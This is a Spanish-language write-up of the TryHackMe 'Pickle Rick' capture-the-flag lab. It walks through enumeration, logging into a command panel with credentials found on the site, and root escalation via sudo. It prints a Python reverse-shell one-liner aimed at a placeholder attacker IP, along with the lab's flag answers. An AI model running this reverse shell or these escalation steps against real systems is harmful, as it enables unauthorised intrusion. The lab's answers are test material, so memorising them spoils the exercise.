# 🥒 Pickle Rick --- TryHackMe! 

------------------------------------------------------------------------

## 📝 Descripción del reto

Pickle Rick es una máquina de TryHackMe de tipo CTF cuyo objetivo es
ayudar a Rick a volver a su forma humana encontrando **tres ingredientes
secretos** repartidos por el sistema.\
Este write-up documenta los pasos que seguí para completarla.

------------------------------------------------------------------------

## 🛠️ Herramientas utilizadas

-   Nmap\
-   Gobuster\
-   Navegador web\
-   Python3 (reverse shell)\
-   Netcat\
-   Sudo

------------------------------------------------------------------------

## 🔍 Proceso de enumeración

### 1. Escaneo inicial

``` bash
nmap -sV -sC -T4 -p- -vv -oN scan_report picklerick.thm
```

Puertos encontrados: - **22/tcp --- SSH** - **80/tcp --- HTTP**

------------------------------------------------------------------------

### 2. Análisis de servicios

Se revisa la página web y el código fuente.\
En un comentario se encuentra un **usuario**.

R1ckRul3s

------------------------------------------------------------------------

### 3. Enumeración adicional

``` bash
gobuster dir -u http://10.80.174.50 -w /usr/share/wordlists/dirb/common.txt -x php,js,html,txt
```

Entradas relevantes: - /login.php\
- /portal.php\
- /robots.txt

En **robots.txt** se encuentra una cadena que funciona como contraseña.

------------------------------------------------------------------------

## 🚀 Explotación

### 1. Acceso al panel

En /login.php funciona: - Usuario → encontrado en código fuente\
- Contraseña → robots.txt

Panel con ejecución limitada de comandos.

------------------------------------------------------------------------

### 2. Primer ingrediente

Mediante `ls` aparece un archivo con el primer ingrediente.\
Como `cat` está bloqueado, se usa:

``` bash
less <archivo>
```

------------------------------------------------------------------------

### 3. Reverse Shell

Se encuentra `clue.txt`, que indica que hay que explorar el sistema.\
Debido a restricciones del panel, se opta por una reverse shell.

Tras varias comprobaciones se descubre que el servidor tiene una versión de python:

``` bash
which python3
```

Para el payload se usa la herramienta de [shell-reverse-cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl):

``` bash
python3 -c 'import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("TU_IP",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh")'
```

En la máquina atacante se inicia un netcat listener:

``` bash
nc -lvnp 1234
```

Se obtiene acceso como **www-data**.

------------------------------------------------------------------------

### 4. Segundo ingrediente

Se encuentra en:

    /home/rick/

------------------------------------------------------------------------

### 5. Escalada de privilegios

``` bash
sudo -l -l
```

Permite ejecutar **bash como root sin contraseña**:

``` bash
sudo bash
```

En `/root/` se encuentra el **tercer ingrediente**.

------------------------------------------------------------------------

## 🗝️ Flags / resultados

-   **Ingrediente 1:** `mr.meeseek hair`
-   **Ingrediente 2:** `1 jerry tear`
-   **Ingrediente 3:** `fleeb juice`

------------------------------------------------------------------------

## 💡 Lecciones aprendidas

-   Revisar el código fuente puede revelar usuarios.\
-   `robots.txt` a veces contiene información sensible.\
-   Si un comando está bloqueado, existen alternativas (`less` vs
    `cat`).\
-   Un panel de comandos suele permitir obtener una reverse shell.\
-   Revisar `sudo -l` siempre es clave para encontrar escaladas
    triviales.\
    
------------------------------------------------------------------------
